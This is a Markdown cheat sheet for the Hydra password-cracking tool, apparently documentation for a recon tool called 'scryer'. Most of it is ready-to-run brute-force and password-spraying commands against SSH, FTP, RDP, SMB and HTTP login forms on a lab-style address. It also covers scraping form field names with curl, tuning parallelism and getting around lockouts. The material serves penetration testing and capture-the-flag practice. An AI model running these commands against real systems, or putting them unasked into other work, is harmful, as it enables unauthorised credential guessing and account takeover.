# Hydra cheat sheet

Online password brute-forcing. scryer prints ready-to-run hydra lines for the
auth services it finds — this is the reference for tuning them.

Bundled lists (relative to repo root):
`scryer/data/wordlists/users.txt`, `scryer/data/wordlists/passwords.txt`.

```bash
U=scryer/data/wordlists/users.txt
P=scryer/data/wordlists/passwords.txt
```

## By service
```bash
# SSH
hydra -L $U -P $P ssh://10.10.10.10 -t 4 -f

# FTP
hydra -L $U -P $P ftp://10.10.10.10 -t 8 -f

# RDP
hydra -L $U -P $P rdp://10.10.10.10 -t 1

# SMB
hydra -L $U -P $P smb://10.10.10.10

# HTTP Basic auth
hydra -L $U -P $P 10.10.10.10 http-get /protected/

# POST login form  (see "finding the form fields" below)
hydra -L $U -P $P 10.10.10.10 http-post-form \
  "/login:username=^USER^&password=^PASS^:F=Invalid credentials"

# HTTPS POST form (port 443)
hydra -L $U -P $P 10.10.10.10 -s 443 https-post-form \
  "/login.php:user=^USER^&pass=^PASS^:F=incorrect"
```

## Single known user (spray one account)
```bash
hydra -l admin -P $P ssh://10.10.10.10 -t 4 -f
# Or single password across many users (password spray):
hydra -L $U -p 'Winter2024!' ssh://10.10.10.10 -t 4
```

## http-post-form field breakdown
`"<path>:<body with ^USER^/^PASS^>:<fail-or-success condition>"`
- `F=text` → this text appears on a **failed** login.
- `S=text` → this text appears on a **successful** login (use when you can't isolate a failure string, e.g. `S=302` or `S=Location`).
- Add extra static params (CSRF token, `submit=Login`) to the body as needed.

### Finding the form fields fast
```bash
# Field names + action:
curl -s http://10.10.10.10/login | grep -Ei 'name=|action='
# Then submit a bad login in the browser and copy the exact error string for F=.
```

## Useful flags
| Flag | Meaning |
|------|---------|
| `-t N` | parallel tasks (SSH: keep ≤4, RDP: 1) |
| `-f` | stop after the first valid pair |
| `-V` / `-vV` | verbose — show every attempt |
| `-s PORT` | non-standard port |
| `-e nsr` | also try null / login-as-pass / reversed |
| `-o found.txt` | write hits to a file |

> Rate-limit awareness: aggressive `-t` on SSH triggers lockouts / `Connection reset`.
> Drop to `-t 4 -W 3` if you see resets.
